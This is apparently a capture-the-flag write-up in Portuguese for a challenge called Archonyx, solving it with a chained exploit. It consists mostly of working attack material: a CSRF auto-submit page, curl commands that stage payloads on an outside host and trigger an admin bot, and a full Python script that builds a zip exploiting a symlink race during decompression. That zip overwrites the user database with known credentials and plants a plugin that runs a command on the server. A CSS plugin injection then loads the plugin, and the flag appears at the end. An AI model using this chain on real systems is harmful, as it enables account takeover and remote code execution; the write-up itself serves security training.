# Archonyx
## Resolvido Por Cesar B

```elixir
O XSS está no frontend, nestes dois innerHTML da view vault.ejs:

  - zip/views/vault.ejs:50 — arquivos de /api/manifests
  - zip/views/vault.ejs:78 — arquivos de /api/cargo

  Exemplo vulnerável:

  item.innerHTML =
    '<div ...><img ... alt="' + filename + '"></div>' +
    '<div ...>' + filename + '</div>';

  filename vem diretamente de fs.readdirSync() em:

  - zip/controllers/apiController.js:90
  - zip/controllers/apiController.js:99

  E pode ser controlado pelo arquivo baixado em:

  - zip/services/uploadService.js:40

  A função que aciona o bot é submitSupport() em zip/controllers/pageController.js:47.

  Observação: o caminho que usamos para obter a flag foi a TOCTOU de symlink no decompress; esse XSS é uma vulnerabilidade adicional.
```

```elixir
┌──(t0x1n㉿t0x1n-Desktop)-[~/…/CyberApocalpise/Archonyx/exploit/dist]
└─$ ls
archonyx-race.zip  trigger.html
                                                                                                                                                                                                                                             
┌──(t0x1n㉿t0x1n-Desktop)-[~/…/CyberApocalpise/Archonyx/exploit/dist]
└─$ cat trigger.html 
<!doctype html>
<html>
<head><meta charset="utf-8"><title>Loading</title></head>
<body>
  <form id="csrf" method="post" action="http://127.0.0.1:1337/api/fetch">
    <input type="hidden" name="url" value="http://56.124.50.97:29466/archonyx-race.zip">
  </form>
  <script>
    setTimeout(function () {
      document.getElementById('csrf').submit();
    }, 400);
  </script>
</body>
</html>
```

```elixir




curl -T exploit/dist/trigger.html \
    http://56.124.50.97:29466/trigger.html

  curl -T exploit/dist/archonyx-race.zip \
    http://56.124.50.97:29466/archonyx-race.zip

  Teste:

  curl -I http://56.124.50.97:29466/trigger.html
  curl -I http://56.124.50.97:29466/archonyx-race.zip

  Se retornar 405 Method Not Allowed ou 403, essa porta não aceita upload; será necessário iniciar um servidor HTTP nela. Depois disso, o fluxo de curl é:

  curl -X POST 'http://154.57.164.80:31840/report' \
    --data-urlencode 'body=test' \
    --data-urlencode 'url=http://56.124.50.97:29466/trigger.html'

  curl -i -c /tmp/a.cookies -X POST \
    'http://154.57.164.80:31840/enter' \
    --data 'username=archon&password=archonyx123'

  curl -b /tmp/a.cookies \
    -H 'Content-Type: application/json' \
    --data '{"css":"@plugin \"/app/pwn.js\";"}' \
    'http://154.57.164.80:31840/ledgermaster/render'

  curl 'http://154.57.164.80:31840/archonyx-flag.txt'

```


```html
<!doctype html>
<html>
<head><meta charset="utf-8"><title>Loading</title></head>
<body>
  <form id="csrf" method="post" action="http://127.0.0.1:1337/api/fetch">
    <input type="hidden" name="url" value="http://56.124.50.97:29466/archonyx-race.zip">
  </form>
  <script>
    setTimeout(function () {
      document.getElementById('csrf').submit();
    }, 400);
  </script>
</body>
</html>
```

```py
#!/usr/bin/env python3
"""Build the Archonyx CSRF + decompress TOCTOU exploit artifacts.

This script does not contact the challenge.  It only creates files under
exploit/dist/ which must later be hosted on an address reachable by the bot.
"""

from __future__ import annotations

import argparse
import html
import json
import stat
import warnings
import zipfile
from pathlib import Path


DEFAULT_PASSWORD = "archonyx123"
DEFAULT_BCRYPT = "$2b$10$0gK8LjDkoKzUftxaLIYyUOyvwuHR33YQ5nyPBx3SKbfn0bgY9xGBe"
DEFAULT_RELAY_KEY = "archonyx-relay-key"
DEFAULT_DRAWS_ID = "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa"


def zip_info(name: str, mode: int) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name, date_time=(2026, 1, 1, 0, 0, 0))
    info.create_system = 3
    info.external_attr = mode << 16
    info.compress_type = zipfile.ZIP_DEFLATED
    return info


def add_race_pair(
    archive: zipfile.ZipFile,
    name: str,
    content: bytes,
    target: str,
) -> None:
    # Order is important.  decompress starts every extraction promise at once:
    # the regular file passes readlink(), then the symlink is created before
    # fs.writeFile() opens the same destination and follows it.
    archive.writestr(zip_info(name, stat.S_IFREG | 0o644), content)
    archive.writestr(
        zip_info(name, stat.S_IFLNK | 0o777),
        target.encode(),
    )


def make_database() -> bytes:
    user_template = {
        "password": DEFAULT_BCRYPT,
        "verified": True,
        "apiKey": DEFAULT_RELAY_KEY,
        "drawsId": DEFAULT_DRAWS_ID,
    }
    database = {
        "users": [
            {
                **user_template,
                "username": "archon",
                "role": "ledgermaster",
            },
            {
                **user_template,
                "username": "bot",
                "role": "warden",
            },
        ],
        "convoys": [],
    }
    return json.dumps(database, separators=(",", ":")).encode()


def make_plugin() -> bytes:
    return b"""module.exports = {
  install: function () {
    const fs = require('fs');
    const cp = require('child_process');
    const flag = cp.execFileSync('/readflag');
    fs.writeFileSync('/app/public/archonyx-flag.txt', flag);
  }
};
"""


def make_archive(output: Path, races: int) -> None:
    database = make_database()
    plugin = make_plugin()

    with warnings.catch_warnings():
        warnings.simplefilter("ignore", UserWarning)
        with zipfile.ZipFile(output, "w", allowZip64=True) as archive:
            for index in range(races):
                add_race_pair(
                    archive,
                    f"db-race-{index:03d}",
                    database,
                    "/app/data/db.json",
                )
                add_race_pair(
                    archive,
                    f"plugin-race-{index:03d}",
                    plugin,
                    "/app/pwn.js",
                )


def make_trigger(output: Path, public_base: str, internal_base: str) -> None:
    archive_url = f"{public_base.rstrip('/')}/archonyx-race.zip"
    action = f"{internal_base.rstrip('/')}/api/fetch"
    document = f"""<!doctype html>
<html>
<head><meta charset="utf-8"><title>Loading</title></head>
<body>
  <form id="csrf" method="post" action="{html.escape(action, quote=True)}">
    <input type="hidden" name="url" value="{html.escape(archive_url, quote=True)}">
  </form>
  <script>
    setTimeout(function () {{
      document.getElementById('csrf').submit();
    }}, 400);
  </script>
</body>
</html>
"""
    output.write_text(document, encoding="utf-8")


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--public-base",
        required=True,
        help="Public URL from which the bot/server can fetch these files",
    )
    parser.add_argument(
        "--internal-base",
        default="http://127.0.0.1:1337",
        help="Application origin as seen by the bot",
    )
    parser.add_argument(
        "--races",
        type=int,
        default=64,
        help="Number of duplicate-entry races per target",
    )
    parser.add_argument(
        "--output",
        type=Path,
        default=Path(__file__).resolve().parent / "dist",
    )
    args = parser.parse_args()

    if args.races < 1 or args.races > 512:
        parser.error("--races must be between 1 and 512")
    if not args.public_base.startswith(("http://", "https://")):
        parser.error("--public-base must start with http:// or https://")
    if not args.internal_base.startswith(("http://", "https://")):
        parser.error("--internal-base must start with http:// or https://")

    args.output.mkdir(parents=True, exist_ok=True)
    archive_path = args.output / "archonyx-race.zip"
    trigger_path = args.output / "trigger.html"
    make_archive(archive_path, args.races)
    make_trigger(trigger_path, args.public_base, args.internal_base)

    print(f"created {archive_path}")
    print(f"created {trigger_path}")
    print(f"login after the bot fetches the archive: archon / {DEFAULT_PASSWORD}")


if __name__ == "__main__":
    main()


```


```
 python3 build.py --public-base http://56.124.50.97:29466  
```

```elixir


HTB{wh4t_th3_l3dg3r_cl34rs_th3_c04st_b3l13v3s_bd069c1c34e815950d856646a7e8d007}

```
### Print Poc1
<img width="1899" height="793" alt="image" src="https://github.com/user-attachments/assets/68d124c0-4201-4cc1-847a-d834ba9eddf8" />




```elixir


HTB{wh4t_th3_l3dg3r_cl34rs_th3_c04st_b3l13v3s_bd069c1c34e815950d856646a7e8d007}

```
